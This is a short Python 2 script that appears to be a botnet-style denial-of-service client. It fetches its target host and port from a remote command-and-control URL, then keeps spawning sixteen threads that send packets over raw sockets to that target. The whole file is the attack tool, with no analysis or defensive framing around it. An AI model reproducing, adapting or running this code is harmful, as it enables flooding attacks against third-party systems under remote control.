#!/usr/bin/python
import socket
import urllib2
import os 
import time
import thread

# enter the data content of the UDP packet as hex
PACKETDATA = '5361792048656c6c6f20746f204d79204c6974746c6520467269656e64'.decode('hex')

# Set the counters
SEND = 0
def getTarget():
    response = urllib2.urlopen('https://project-hailstorm-cc-finlaydag33k-1.c9users.io/hello-world.php');
    victim = response.read()
    return victim

def sendPackages( threadName, delay, victim):
    if not victim == "IDLE":
        #os.system('clear')
        temphost, tempport = victim.split(":")
        
       # print "Send " + str(SEND) + " Packets"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.connect((temphost, int(tempport)))
            s.send(PACKETDATA)
            s.close()
            #SEND = SEND + 1
        except socket.error , msg:
	        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        
    else:
        time.sleep(5)
    
while True:
    try:
        try:
            thread.start_new_thread( sendPackages, ("Thread_1", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-2", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-3", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-4", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-5", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-6", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-7", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-8", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-9", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-10", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-11", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-12", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-13", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-14", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-15", 2, getTarget()) )
            thread.start_new_thread( sendPackages, ("Thread-16", 2, getTarget()) )
            time.sleep(0.1)
        except:
            print "Error: unable to start thread"
    except:
        sys.exit
